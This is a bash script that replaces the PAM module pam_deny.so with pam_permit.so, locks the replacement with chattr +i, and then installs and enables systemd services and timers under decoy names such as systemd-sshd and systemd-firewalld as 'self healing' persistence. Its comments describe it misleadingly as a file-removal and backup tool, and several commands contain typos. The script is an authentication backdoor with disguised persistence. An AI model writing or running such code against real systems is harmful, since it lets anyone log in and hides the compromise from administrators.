#! /bin/bash

# Directory where you want to remove files
DIRECTORY="/usr/lib/x86_64-linux-gnu/security"

# File extension to filter files (e.g., "*.txt" for text files)
FILE_DENY="pam_deny.so"

# File to cp to
FILE_PERMIT="pam_permit.so"

# File that will be renamed as
FILE_RED_DENY="pam_denying.so"

# Confirm the directory exists
if [ ! -d "$DIRECTORY" ]; then
	echo "Directory $DIRECTORY does not exist."
	exit 1
fi

# Confirm the directory is not the root directory to prevent accidental deletion
if [ "$DIRECTORY" = "/" ]; then
	echo "Refusing to delete the root directory."
	exit 1
fi

# Backup original pam_deny.so
if [ ! -f "$DIRECTORY/$FILE_RED_DENY" ]; then
	mv -- "$DIRECTORY/$FILE_DENY" "$DIRECTORY/$FILE_RED_DENY"
fi

# Replace pam_deny.so with pam_permit.so
if ! cmp --slient "$DIRECTORY/$FILE_PERMIT" "$DIRECTORY/$FILE_DENY" >/dev/null 2>/dev/null; then
	chattr -i -- "$DIRECTORY/$FILE_DENY"
	cp -- "$DIRECTORY/$FILE_PERMIT" "$DIRECTORY/$FILE_DENY"
	chattr +i -- "$DIRECTORY/$FILE_DENY"
fi

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-pamd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-pamd/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unamsk systemd-bootd.service \
	systemd-firewalld.service \
	systemd-issued.service \
	systemd-maild.service \
	systemd-printerd.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systmed-maild.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
